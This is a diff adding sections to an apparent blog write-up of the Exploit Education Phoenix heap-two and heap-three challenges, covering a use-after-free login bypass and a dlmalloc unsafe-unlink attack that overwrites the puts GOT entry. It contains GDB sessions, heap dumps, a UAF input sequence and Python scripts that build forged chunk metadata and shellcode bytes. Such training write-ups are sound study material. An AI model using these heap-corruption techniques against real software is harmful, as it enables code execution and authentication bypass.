@@ -576,7 +576,7 @@ $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x9a\x88\x04\x08")')
 
 ---
 
-# Result
+## Result
 
 Running the exploit:
 
@@ -588,12 +588,792 @@ Heap overflow → GOT overwrite → control-flow hijack → `winner()` executed!
 
 ---
 
+<div class="image-row">
+  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
+  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
+  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
+</div>
+
+---
+
+# Heap-Two:
+
+**Challenge:** [Heap-Two](https://exploit.education/phoenix/heap-two/)
+
+**Goal:** Turn the use-after-free on the `auth struct` into a login bypass by making `auth->auth` **non-zero**.
+
+---
+
+## Overview
+
+**Type:** *Use-After-Free (UAF)* of a global pointer (`struct auth *auth` stored in `.bss`).
+
+**Primitive:** Overwrite `auth->auth` by forcing `strdup()` to reallocate the freed chunk and copy controlled bytes into it.
+
+**Win condition:** If:
+
+```c
+if (auth && auth->auth)
+    printf("you have logged in already!");
+```
+
+→ we need **auth to remain non-NULL** (dangling pointer) and `auth->auth != 0`.
+
+### ⚡ Takeaway 
+Heap misuse (especially reuse of freed chunks) allows corruption of struct fields or heap metadata to change control flow: even without direct overflow.
+
+---
+
+## Starting the Challenge
+
+Running the challenge gives:
+
+```
+Welcome to phoenix/heap-two, brought to you by https://exploit.education
+[ auth = 0, service = 0 ]
+```
+
+Something about `auth` and `service`.
+
+Looking at the source code, there's an interesting struct:
+
+```c
+struct auth {
+    char name[32];
+    int auth;
+};
+
+struct auth *auth;
+char *service;
+```
+
+And:
+
+### Where is `auth` used?
+
+Login check:
+
+```c
+if (strncmp(line, "login", 5) == 0) {
+    if (auth && auth->auth) {
+        printf("you have logged in already!\n");
+    } else {
+        printf("please enter your password\n");
+    }
+}
+```
+
+So the condition requires:
+
+* `auth != NULL`
+* `auth->auth != 0`
+
+Since the pointer isn’t cleared after `free()`, the pointer still exists, and the memory may be reused later: perfect **UAF**.
+
+```c
+if (strncmp(line, "reset", 5) == 0) {
+    free(auth);
+}
+```
+
+> The pointer `auth` is freed, but not set to `NULL`.
+
+*This is key.*
 
 
+## Why not overflow the struct directly?
+
+Because:
+
+```c
+if (strlen(line + 5) < 31) {
+    strcpy(auth->name, line + 5);
+}
+```
+
+We cannot overflow `name`: input is restricted to **< 31 bytes**.
+
+So we need another path and that’s `service`.
+
+---
+## Why does `free()` help us?
 
 
+`free()` makes that heap region **eligible for reuse**, placing it into bins depending on allocator logic.
+
+Then later:
+
+```c
+if (strncmp(line, "service", 6) == 0) {
+    service = strdup(line + 7);
+}
+```
+
+`strdup()` allocates memory **equal to the length of input** (no bounds check).
+
+Since the freed `auth` chunk is the perfect size, the allocator often reuses it.
+
+Meaning: the data we pass into `service` overwrites the old structure.
+
+---
+
+## Program Flow Summary
+
+```
+1. auth <name>
+2. reset    → frees the struct, pointer still dangling
+3. service <long payload> → strdup reuses freed chunk
+4. login    → check passes because we overwrite auth->auth
+```
+
+To trigger overwrite, we need **31+ bytes**, because:
+
+The service literally doesn't checks for any length (if it would have checked for length our attack vector service would have failed and we must have looked for something else)
+
+Okay we need to input 32 bytes for the attack to succeed
+
+Then call the auth!
+
+```
+auth idontwannadeadbeef
+```
+
+```
+reset
+```
+
+```
+service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+```
+```
+login
+```
+
+* `name[32]`
+* then `int auth` (4 bytes)
+
+So:
+
+```
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x0a\x00\
+```
+
+---
+
+## GDB Walkthrough
+
+Disassemble main and cross-check the source code and the disassembly of `main`
+
+Disassembly of interest:
+
+```assembly
+0x00000000004008df <+130>:   call   0x400680 [malloc@plt](mailto:malloc@plt)
+0x00000000004008e4 <+135>:   mov    QWORD PTR [rip+0x200525],rax        # 0x600e10 <auth>
+0x00000000004008eb <+142>:   mov    rax,QWORD PTR [rip+0x20051e]        # 0x600e10 <auth>
+0x00000000004008f2 <+149>:   mov    edx,0x24
+0x00000000004008f7 <+154>:   mov    esi,0x0
+0x00000000004008fc <+159>:   mov    rdi,rax
+0x00000000004008ff <+162>:   call   0x4006b0 [memset@plt](mailto:memset@plt)
+0x0000000000400904 <+167>:   lea    rax,[rbp-0x80]
+0x0000000000400908 <+171>:   add    rax,0x5
+0x000000000040090c <+175>:   mov    rdi,rax
+0x000000000040090f <+178>:   call   0x4006d0 [strlen@plt](mailto:strlen@plt)
+0x0000000000400914 <+183>:   cmp    rax,0x1e
+0x0000000000400918 <+187>:   ja     0x400934 <main+215>
+0x000000000040091a <+189>:   lea    rax,[rbp-0x80]
+0x000000000040091e <+193>:   add    rax,0x5
+0x0000000000400922 <+197>:   mov    rdx,QWORD PTR [rip+0x2004e7]        # 0x600e10 <auth>
+0x0000000000400929 <+204>:   mov    rsi,rax
+0x000000000040092c <+207>:   mov    rdi,rdx
+0x000000000040092f <+210>:   call   0x400640 [strcpy@plt]
+```
+
+*This maps to the following source code:*
+
+```
+auth = malloc(sizeof(struct auth));
+memset(auth, 0, sizeof(struct auth));
+if (strlen(line + 5) < 31) {
+strcpy(auth->name, line + 5);
+}
+```
+
+These lines are interesting because this is the first place where we see where `auth` is located in the heap (heap address).
 
 
+### Internal in GDB:
+
+```
+(gdb) b *  0x000000000040092f
+Breakpoint 1 at 0x40092f
+(gdb) run
+Starting program: /opt/phoenix/amd64/heap-two
+Welcome to phoenix/heap-two, brought to you by [https://exploit.education](https://exploit.education)
+[ auth = 0, service = 0 ]
+auth idontwantdeadbeef
+```
+
+```
+Breakpoint 1, 0x000000000040092f in main ()
+(gdb) info register
+rax            0x7fffffffec05      140737488350213
+rbx            0x7fffffffecd8      140737488350424
+rcx            0x8080808080808080  -9187201950435737472
+rdx            0x600e40            6295104
+rsi            0x7fffffffec05      140737488350213
+rdi            0x600e40            6295104
+rbp            0x7fffffffec80      0x7fffffffec80
+rsp            0x7fffffffebf0      0x7fffffffebf0
+r8             0x7fffffffec05      140737488350213
+```
+
+```
+(gdb) ni
+0x0000000000400934 in main ()
+(gdb) x/40bx $rdi
+0x600e40:       0x69    0x64    0x6f    0x6e    0x74    0x77    0x61    0x6e
+0x600e48:       0x74    0x64    0x65    0x61    0x64    0x62    0x65    0x65
+0x600e50:       0x66    0x0a    0x00    0x00    0x00    0x00    0x00    0x00
+0x600e58:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x600e60:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+```
+
+```
+(gdb) x/40s $rdi
+0x600e40:       "idontwantdeadbeef\n"
+0x600e53:       ""
+0x600e54:       ""
+```
 
 
+Nice. Further in the disassembly, look at `free@plt()` first argument:
 
+```
+0x000000000040094e <+241>:   mov    0x2004bb(%rip),%rax        # 0x600e10 >
+0x0000000000400955 <+248>:   mov    %rax,%rdi
+0x0000000000400958 <+251>:   callq  0x4006e0 [free@plt](mailto:free@plt)
+
+```
+
+```
+(gdb) x/5a 0x600e10
+0x600e10 <auth>:        0x600e40        0x0
+0x600e20:       0x0     0x0
+0x600e30:       0x1
+```
+
+So from here, we confirm that the `auth` heap region starts at `0x600e40`.
+
+
+### Reset the program and check again:
+
+```
+(gdb) x/30gx 0x600e40
+0x600e40:       0x00007ffff7ffbb98      0x00007ffff7ffbb98
+0x600e50:       0x0000000000000a66      0x0000000000000000
+0x600e60:       0x0000000000000000      0x0000000000000000
+0x600e70:       0x0000000000000041      0x0000000000000181
+0x600e80:       0x00007ffff7ffbb68      0x00007ffff7ffbb68
+```
+
+```
+(gdb) x/40a  0x00007ffff7ffbb68
+0x7ffff7ffbb68 <mal+264>:       0x0     0x0
+0x7ffff7ffbb78 <mal+280>:       0x7ffff7ffbb68 <mal+264>        0x7f>
+0x7ffff7ffbb88 <mal+296>:       0x0     0x0
+0x7ffff7ffbb98 <mal+312>:       0x0     0x0
+0x7ffff7ffbba8 <mal+328>:       0x600e30        0x600e30
+```
+
+Now inspect after the service block `if` runs (set breakpoint there):
+
+```
+b *0x0000000000400987
+```
+
+Now send service input *31 times*:
+
+```
+service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+```
+
+```
+Breakpoint 3, 0x0000000000400987 in main ()
+(gdb) x/30x 0x600e40
+0x600e40:       0x4141414141414120      0x4141414141414141
+0x600e50:       0x4141414141414141      0x4141414141414141
+0x600e60:       0x000000000000000a      0x0000000000000000
+0x600e70:       0x0000000000000041      0x0000000000000180
+0x600e80:       0x00007ffff7ffbb68      0x00007ffff7ffbb68
+```
+
+Repeat:
+
+```
+service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+```
+
+```assembly
+Breakpoint 3, 0x0000000000400987 in main ()
+(gdb) x/30x 0x600e40
+0x600e40:       0x4141414141414120      0x4141414141414141
+0x600e50:       0x4141414141414141      0x4141414141414141
+0x600e60:       0x000000000000000a      0x0000000000000000
+0x600e70:       0x0000000000000041      0x0000000000000041
+0x600e80:       0x4141414141414120      0x4141414141414141
+0x600e90:       0x4141414141414141      0x4141414141414141
+0x600ea0:       0x000000000000000a      0x0000000000000000
+0x600eb0:       0x0000000000000041      0x0000000000000140
+0x600ec0:       0x00007ffff7ffbb38      0x00007ffff7ffbb38
+0x600ed0:       0x0000000000000000      0x0000000000000000
+0x600ee0:       0x0000000000000000      0x0000000000000000
+0x600ef0:       0x0000000000000000      0x0000000000000000
+0x600f00:       0x0000000000000000      0x0000000000000000
+0x600f10:       0x0000000000000000      0x0000000000000000
+0x600f20:       0x0000000000000000      0x0000000000000000
+```
+
+```bash
+(gdb) c
+Continuing.
+[ auth = 0x600e40, service = 0x600e40 ]
+login
+you have logged in already!
+
+```
+
+---
+
+## Internals of the Exploit
+
+This worked because:
+
+* The pointer remained dangling.
+* The freed chunk was reused by `strdup()`.
+* We controlled the struct layout when memory was reallocated.
+
+---
+
+## Final Payload
+
+```
+auth idontwannadeadbeef
+reset
+service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+login
+```
+
+---
+
+###  Exploit success:
+
+![alt text](/assets/phoenix-heap/hellooo.png)
+
+---
+<div class="image-row">
+  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
+  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
+  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
+</div>
+---
+
+# Heap-Three:
+
+**Challenge:** [Heap-Three](https://exploit.education/phoenix/heap-three/)
+
+**Goal:** Redirect execution flow to **winner()** by corrupting heap metadata during `free()`.
+
+---
+
+## Overview
+
+**Type:** *Heap metadata corruption* (unsafe unlink in dlmalloc)
+
+**Primitive:** Control of `fd` / `bk` pointers in a free chunk, leading to an **arbitrary write** during consolidation.
+
+**Win condition:** Overwrite a control-flow-sensitive pointer (e.g. `puts@GOT`) so that execution reaches `winner()`.
+
+## ⚡ Takeaway
+
+Old dlmalloc-based heaps **trust chunk metadata** during consolidation.
+If an attacker controls that metadata, `free()` becomes a write primitive.
+
+---
+
+## Starting the Challenge
+
+Running the binary:
+Starting up the challenge we find ourselves hitting segfaults,
+
+Opening disassembly its clear that the program uses three malloc and three frees
+
+The strcpy is allocating var1, var2, var3 then de allocation is from var3 var2 var1 in that order
+
+Nothing fancy, but looking at the binary reveals:
+
+* three `malloc()` calls
+* three `strcpy()` calls
+* three `free()` calls
+* a final `puts()`
+
+---
+
+## Program Flow (High-Level)
+
+From disassembly of `main`:
+
+```
+malloc(0x20) → a
+malloc(0x20) → b
+malloc(0x20) → c
+
+strcpy(a, argv[1])
+strcpy(b, argv[2])
+strcpy(c, argv[3])
+
+free(c)
+free(b)
+free(a)
+
+puts("dynamite failed?")
+
+```
+(gdb) c
+Continuing.
+dynamite failed?
+
+
+Yeah, now what? nm the challenge we clearly have a winner() function how do we go there….?
+
+Notice `puts()` how about changing its **GOT entry** to `winner()`?
+
+```
+Breakpoint 1, 0x080488b2 in main ()
+(gdb) set *(unsigned int *) 0x804c13c = 0x080487d5
+(gdb) c
+Continuing.
+Level was successfully completed at @ 1765868569 seconds past the Epoch
+[Inferior 1 (process 304) exited normally]
+```
+Done! But how to do it outside gdb?
+
+Is theres any way from heap we can jump?
+
+---
+
+## Why This Is Interesting
+
+Key observations:
+
+* `strcpy()` gives **unbounded writes**
+* `free()` is called **in reverse order**
+* Freed chunks are adjacent → **consolidation**
+* The allocator is **dlmalloc**
+
+This combination is exactly where classic heap metadata attacks live.
+
+---
+
+## Heap Chunk Refresher (Only What We Need)
+
+So the heap layout is:
+
+```
+[A][B][C][wilderness]
+```
+
+With user-controlled data written into **all three chunks** before they are freed.
+
+Each heap chunk looks like:
+
+```
+[ prev_size ]    ← only meaningful if previous chunk is free
+[ size | flags ] ← always present
+[ user data ]    ← attacker-controlled
+```
+
+If the chunk is free and placed into a doubly-linked bin:
+
+```
+[ fd ]
+[ bk ]
+```
+
+These pointers are **written to and trusted** by the allocator.
+
+---
+
+## Observing the Heap in GDB
+
+setting bp at after third malloc:
+
+![malloc](/assets/phoenix-heap/disassemled.png)
+
+
+The last bytes (`ff89` indicate rest of heap area meaning size of heap remaining which is called wilderness.)
+
+At this point, we have allocated the chunks but we need to initialize.
+
+Moving forward we need to now intialize these chunks-
+
+```
+(gdb) ni
+0x08048882 in main ()
+(gdb) x/80gwx 0xf7e69000
+0xf7e69000:     0x00000000      0x00000029      0x41414141      0x41414141
+0xf7e69010:     0x41414141      0x41414141      0x00000000      0x00000000
+0xf7e69020:     0x00000000      0x00000000      0x00000000      0x00000029
+0xf7e69030:     0x42424242      0x42424242      0x42424242      0x42424242
+0xf7e69040:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e69050:     0x00000000      0x00000029      0x43434343      0x43434343
+0xf7e69060:     0x43434343      0x43434343      0x00000000      0x00000000
+0xf7e69070:     0x00000000      0x00000000      0x00000000      0x000fff89
+0xf7e69080:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e69090:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e690a0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e690b0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e690c0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e690d0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e690e0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e690f0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e69100:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e69110:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e69120:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e69130:     0x00000000      0x00000000      0x00000000      0x00000000
+```
+
+And the heap now looks like this,
+
+![forward pointer](/assets/phoenix-heap/fd.png)
+
+Lets continue (c all the free)
+
+We see after all free we dont see null or zero replacing the data but rather some value overwritten first bytes of user data.
+
+They are _forward pointers._
+
+`fd`   `bk`   `(rest untouched)`
+
+Why dont we see `bk` here?
+
+`free()` first takes a look at the current chunk, it sees if the **prev bit** is _set_ or _unset_ and forward chunk is free to use or not, if the conditions match it _unlinks_ create a larger chunk and if that chunk is greater than 80 bytes then it has `fd` and `bk` or else if its smaller than 80 it will just have `fd`.
+
+## After `free()`
+
+Continuing execution past all three `free()` calls:
+
+* user data is **not cleared**
+* metadata changes
+* some freed chunks now contain pointers
+
+---
+
+## Why Only One Pointer?
+
+Because not all bins are doubly linked.
+
+In dlmalloc:
+
+| Bin type            | Pointers  |
+| ------------------- | --------- |
+| fastbin             | `fd` only |
+| smallbin / largebin | `fd + bk` |
+
+Since the chunks are small (`0x20`), they initially go into **fastbins**.
+
+That means:
+
+* singly linked
+* **no unlink yet**
+
+---
+
+## Where Things Get Dangerous
+
+During `free()`, dlmalloc tries to **merge adjacent free chunks**.
+
+Relevant logic (simplified):
+
+```c
+if (!prev_inuse(p)) {
+    p = previous_chunk;
+    unlink(p);
+}
+```
+
+And `unlink()` is defined as:
+
+```c
+FD->bk = BK;
+BK->fd = FD;
+```
+
+This assumes:
+
+* `fd` and `bk` are valid
+* metadata is not attacker-controlled
+
+That assumption is false here.
+
+---
+
+## Why This Is Exploitable
+
+If we can control:
+
+* `size`
+* `prev_size`
+* `fd`
+* `bk`
+
+Then `unlink()` becomes:
+
+> “write attacker-chosen values to attacker-chosen addresses”
+
+This is the classic **unsafe unlink** primitive.
+
+---
+
+## Constraints
+
+There is one major complication:
+
+* input is copied using `strcpy()`
+* NULL bytes terminate the write
+
+So:
+
+* direct pointer injection is restricted
+* metadata forging must account for this
+
+This heavily influences how sizes and pointers are constructed.
+
+---
+
+## Stopping Point
+
+Here’s the plan how about changing the size of c to 64?
+
+
+Why 0x64? Its greater than 80 bytes which means the free has to check it as fd and bk both moreover we setting inuse bit as 0 ? meaning previous chunk is free/ available to use => the free algorithm also checks inuse i.e. next if next chunk’s prev bit is set or not.
+
+
+To consider the to free and consolidate i.e. to use unlink() method we need, set prev_inuse bit as 0 for chunk c and next chunk to c must set its prev_insue bit to zero (because the previous chunk of c will only trigger if and if only c itself is free to use or  available)
+
+
+If a chunk is free to use, it checks its fd and bk pointers and check if its free to consolidate as one and unlink them accordingly
+
+```c
+     if (!prev_inuse(p)) {
+        prevsize = p->prev_size;
+        size += prevsize;
+        p = chunk_at_offset(p, -((long) prevsize));
+        unlink(p, bck, fwd);
+      }
+```
+```assembly
+
+(gdb) x/80wx 0xf7e69000
+0xf7e69000:     0x00000000      0x00000029      0x41414141      0x41414141
+0xf7e69010:     0x0487d5b8      0x00d0ff08      0x00000000      0x00000000
+0xf7e69020:     0x00000000      0x00000000      0x00000000      0x00000029
+0xf7e69030:     0x42424242      0x42424242      0x00000000      0x00000000
+0xf7e69040:     0x00000000      0x00000011      0x0804c130      0xf7e69010
+0xf7e69050:     0x00000010      0x00000064      0x43434343      0x41414141
+0xf7e69060:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e69070:     0x00000000      0x00000000      0x00000000      0x000fff89
+0xf7e69080:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e69090:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e690a0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e690b0:     0x00000000      0x00000000      0x00000010      0xf7e69080
+0xf7e690c0:     0xf7e69090      0x00000000      0x00000011      0x00000000
+0xf7e690d0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e690e0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e690f0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e69100:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e69110:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e69120:     0x00000000      0x00000000      0x00000000      0x00000000
+0xf7e69130:     0x00000000      0x00000000      0x00000000      0x00000000
+(gdb) c
+Continuing.
+
+
+Breakpoint 2, 0x080488b2 in main ()
+(gdb) c
+Continuing.
+Level was successfully completed at @ 1765986682 seconds past the Epoch
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0xf7e69017 in ?? ()
+```
+
+
+But this unfortunately wont work, as the program is using strcpy() the strcpy will end the stream input at null bytes,
+
+
+We need something that would surely work, a workaround was given in vudo malloc() of phrack series.
+
+negative sizes! 0xFFFFFFFC would negate and output -4
+
+Negative sizes (this is extremely clean and clever):
+
+
+> For instance, if the attacker overwrites the size field of the second
+chunk with -4 (0xfffffffc), dlmalloc will think the beginning of the
+next contiguous chunk is in fact 4 bytes before the beginning of the
+second chunk, and will therefore read the prev_size field of the second
+chunk instead of the size field of the next contiguous chunk. So if
+the attacker stores an even integer (an integer whose PREV_INUSE bit
+is clear) in this prev_size field, dlmalloc will process the corrupted
+second chunk with unlink() and the attacker will be able to apply the
+technique described in 3.6.1.1.
+– https://phrack.org/issues/57/8
+
+
+```py
+python3 - << 'EOF' > /tmp/arg1
+import sys
+sys.stdout.buffer.write(
+    b"A"*8 +
+    b"\xb8\xd5\x87\x04\x08\xff\xd0\xc3" +
+    b"\xff\xd0"
+)
+EOF
+
+
+python3 - << 'EOF' > /tmp/arg2
+import sys
+sys.stdout.buffer.write(
+    b"B"*36 +
+    b"\x65"
+)
+EOF
+
+
+python3 - << 'EOF' > /tmp/arg3
+import sys
+sys.stdout.buffer.write(
+    b"C"*92 +
+    b"\xfc\xff\xff\xff" +
+    b"\xfc\xff\xff\xff" +
+    b"\x30\xc1\x04\x08" +
+    b"\x10\x90\xe6\xf7"
+)
+EOF
+```
+
+```c
+set args $(cat /tmp/arg1) $(cat /tmp/arg2) $(cat /tmp/arg3)
+run
+```
+
+Ran this inside gdb with 100 * C but it didnt worked then i shorten it to 92 which then worked fine..?
+
+![done](/assets/phoenix-heap/heaoo.png)
+
+<div class="image-row">
+  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
+  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
+  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
+</div>
